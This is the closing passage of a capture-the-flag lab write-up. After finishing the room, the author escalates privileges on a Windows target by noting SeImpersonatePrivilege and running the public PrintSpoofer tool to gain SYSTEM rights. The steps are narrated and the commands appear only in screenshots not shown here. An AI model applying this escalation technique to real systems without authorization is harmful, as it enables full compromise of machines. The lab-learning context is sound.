href="https://remnote-user-data.s3.amazonaws.com/hbectJPQQpPnlL-HLoKLHIUxXXEf6Wbw-H1rmKyHH4IUr_rPf9g6iq0-1jTf5Fa0e1Wt7hWsSpwcn7nd7k2KlAcXLyE7j4hePRaJaE_yy1iCNFAfrP6KTQoUg03syTf2.png"><img style="width:700px" src="https://remnote-user-data.s3.amazonaws.com/hbectJPQQpPnlL-HLoKLHIUxXXEf6Wbw-H1rmKyHH4IUr_rPf9g6iq0-1jTf5Fa0e1Wt7hWsSpwcn7nd7k2KlAcXLyE7j4hePRaJaE_yy1iCNFAfrP6KTQoUg03syTf2.png"/></a></figure><p id="19706ab9-239d-8189-afa2-c0d066b09951" class="">We get the password and the room is complete!</p><p id="19706ab9-239d-80e9-91a4-e54c54b1ef2c" class=""><br/><br/><strong><span style="border-bottom:0.05em solid">Priv-esc:</span></strong></p><p id="19706ab9-239d-8080-8091-e0c0462eeeac" class="">Although not required for this room, I still try to escalate our privileges.<br/>By checking &quot;whoami /priv&quot; we see we have &quot;SeImpersonatePrivilege&quot;<br/></p><figure id="19706ab9-239d-8178-adda-f3770c453d02" class="image"><a href="https://remnote-user-data.s3.amazonaws.com/o_ndg4E0OKbsM8HVYEU4uUPhBFnsAutNF6ySRfGURIaFHwQe8YCaeXHwUl62Jpg_gxgVO1J2jzKxLcu9q48igmCMCqHymZmSRMjh125uA6M1EeeU7k-xaFS52vySCDHp.png"><img style="width:700px" src="https://remnote-user-data.s3.amazonaws.com/o_ndg4E0OKbsM8HVYEU4uUPhBFnsAutNF6ySRfGURIaFHwQe8YCaeXHwUl62Jpg_gxgVO1J2jzKxLcu9q48igmCMCqHymZmSRMjh125uA6M1EeeU7k-xaFS52vySCDHp.png"/></a></figure><p id="19706ab9-239d-815f-b72b-e62a9caa31d1" class="">We can use PrintSpoofer</p><p id="19706ab9-239d-81f4-a197-f7c4228bf8fa" class=""><a href="https://github.com/itm4n/PrintSpoofer?isPin=false">GitHub - itm4n/PrintSpoofer: Abusing impersonation privileges through the &quot;Printer Bug&quot;</a></p><p id="19706ab9-239d-8137-b20e-efc890b72e01" class="">to priv-esc to Administrator. We just have to upload it to the target and run</p><figure id="19706ab9-239d-81bb-b1f8-f4bd43a7153b" class="image"><a href="https://remnote-user-data.s3.amazonaws.com/QAvgG_lESBhqmPEAwtNDFNkDI4oyQdIfISpzaJKrgkpMjXAjkzYIXqyAnFzNyVbRyNhcIXVv9hh6yZStUss-rWRj0pVdI-GsX_xU7QvjgwJqf3NuyvF-jysYim8pLxGa.png"><img style="width:700px" src="https://remnote-user-data.s3.amazonaws.com/QAvgG_lESBhqmPEAwtNDFNkDI4oyQdIfISpzaJKrgkpMjXAjkzYIXqyAnFzNyVbRyNhcIXVv9hh6yZStUss-rWRj0pVdI-GsX_xU7QvjgwJqf3NuyvF-jysYim8pLxGa.png"/></a></figure><p id="19706ab9-239d-8121-92e0-cae63c04572a" class="">And we have the highest privileges of a Windows system &quot;<strong>nt authority\system</strong>&quot;.<br/>Thank you for reading :)<br/></p><p id="19706ab9-239d-80c0-9a71-dfd86f266980" class=""><br/>My linkedin: <br/><a href="https://www.linkedin.com/in/imshadab18">https://www.linkedin.com/in/imshadab18</a></p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
